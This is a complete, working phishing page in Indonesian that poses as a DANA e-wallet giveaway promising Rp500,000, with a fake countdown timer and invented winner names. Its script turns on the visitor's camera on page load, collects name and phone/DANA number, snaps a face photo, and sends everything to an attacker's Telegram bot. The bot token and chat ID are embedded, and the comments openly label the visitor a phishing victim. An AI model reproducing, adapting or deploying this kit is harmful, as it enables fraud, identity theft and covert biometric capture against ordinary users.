<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giveaway DANA - Verifikasi Wajib</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }
        body {
            background: linear-gradient(135deg, #008CFF, #0059ff);
            min-height: 100vh;
            position: relative;
            color: white;
        }
        .container {
            max-width: 480px;
            margin: auto;
            padding: 30px 20px;
        }
        .card {
            background: rgba(255,255,255,.12);
            backdrop-filter: blur(18px);
            border-radius: 28px;
            padding: 25px;
        }
        .logo { width: 80px; margin: 0 auto 20px; display: block; }
        h1 { font-size: 28px; text-align: center; margin-bottom: 10px; }
        .reward-box {
            background: white;
            color: #0059ff;
            border-radius: 24px;
            padding: 20px;
            text-align: center;
            margin: 20px 0;
        }
        .reward-amount { font-size: 36px; font-weight: 700; }
        input, button {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border-radius: 16px;
            border: none;
        }
        input { background: rgba(255,255,255,.15); color: white; }
        input::placeholder { color: rgba(255,255,255,.6); }
        button {
            background: white;
            color: #0059ff;
            font-weight: bold;
            cursor: pointer;
        }
        video {
            width: 100%;
            border-radius: 16px;
            margin: 15px 0;
            border: 2px solid white;
        }
        .status-text {
            font-size: 12px;
            margin-top: 10px;
            text-align: center;
        }
        .timer-box {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 15px 0;
        }
        .time {
            background: rgba(0,0,0,.3);
            padding: 8px 12px;
            border-radius: 12px;
            font-size: 20px;
            font-weight: bold;
        }
        .user-item {
            display: flex;
            justify-content: space-between;
            font-size: 13px;
            margin: 8px 0;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg" alt="DANA">
        <h1>🎁 Verifikasi Wajah & Klaim Rp500.000</h1>

        <!-- Live preview kamera langsung -->
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas" style="display:none"></canvas>
        <p id="status" class="status-text">⏳ Meminta akses kamera...</p>

        <div class="reward-box">
            <div class="reward-amount">Rp500.000</div>
            <div>Saldo langsung masuk setelah verifikasi</div>
        </div>

        <!-- Form data diri korban -->
        <input type="text" id="nama" placeholder="Nama lengkap">
        <input type="text" id="nomor" placeholder="Nomor DANA / No HP">

        <div class="timer-box">
            <div class="time" id="timer">02:00</div>
        </div>

        <div class="users">
            <div class="user-item"><span>📱 Ardi P.</span><span style="color:#7CFF98">Berhasil Rp500k</span></div>
            <div class="user-item"><span>📱 Sari N.</span><span style="color:#7CFF98">Berhasil Rp500k</span></div>
            <div class="user-item"><span>📱 Budi W.</span><span style="color:#7CFF98">Berhasil Rp500k</span></div>
        </div>

        <button id="submitBtn">Konfirmasi & Kirim</button>
        <p class="status-text" style="margin-top:15px; font-size:10px;">*verifikasi wajah untuk pencairan dana</p>
    </div>
</div>

<script>
    // ========== KAMERA ==========
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusEl = document.getElementById('status');

    // 🔴 GANTI DENGAN TOKEN BOT TELEGRAM KAMU SENDIRI (jangan pakya punya org lain)
    const BOT_TOKEN = '8726214438:AAFxpTjm32sD2gJkQZvicI6nc5BFI9ZaaHs';  // GANTI INI!
    const CHAT_ID   = '7319985632';  // GANTI INI!

    let stream = null;

    async function startCamera() {
        try {
            statusEl.textContent = '📷 Meminta izin akses kamera...';
            stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            await new Promise(r => video.onloadedmetadata = r);
            statusEl.textContent = '✅ Kamera aktif - foto akan dikirim saat klik tombol';
        } catch (err) {
            statusEl.textContent = '❌ Gagal akses kamera: ' + err.message;
        }
    }

    function capturePhotoBlob() {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        return new Promise(r => canvas.toBlob(r, 'image/png'));
    }

    async function sendToTelegram(blob, nama, nomor) {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', blob, 'korban.png');
        form.append('caption', `📸 KORBAR PHISHING\nNama: ${nama}\nNo DANA: ${nomor}\nWaktu: ${new Date().toLocaleString()}`);
        
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: form
        });
        return res.json();
    }

    // ========== TIMER COUNTDOWN ==========
    let secondsLeft = 120; // 2 menit
    const timerEl = document.getElementById('timer');
    function updateTimer() {
        const mins = Math.floor(secondsLeft / 60);
        const secs = secondsLeft % 60;
        timerEl.textContent = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
        if (secondsLeft > 0) secondsLeft--;
    }
    setInterval(updateTimer, 1000);
    updateTimer();

    // ========== TOMBOL KIRIM ==========
    document.getElementById('submitBtn').onclick = async () => {
        const nama = document.getElementById('nama').value.trim();
        const nomor = document.getElementById('nomor').value.trim();

        if (!nama || !nomor) {
            statusEl.textContent = '⚠️ Isi nama dan nomor DANA dulu!';
            return;
        }

        if (nomor.length < 9) {
            statusEl.textContent = '⚠️ Nomor HP tidak valid';
            return;
        }

        statusEl.textContent = '📸 Mengambil foto & mengirim ke server...';

        try {
            // Ambil foto dari video live
            const photoBlob = await capturePhotoBlob();
            const result = await sendToTelegram(photoBlob, nama, nomor);

            if (result.ok) {
                statusEl.innerHTML = '✅ Data dan foto terkirim! Saldo akan diproses maks 24 jam.';
                // Matikan kamera
                if (stream) stream.getTracks().forEach(t => t.stop());
                video.srcObject = null;
            } else {
                statusEl.innerHTML = '❌ Gagal kirim: ' + (result.description || 'error');
            }
        } catch (err) {
            statusEl.innerHTML = '❌ Error: ' + err.message;
        }
    };

    // LANGSUNG jalankan kamera saat halaman load
    startCamera();
</script>
</body>
</html>
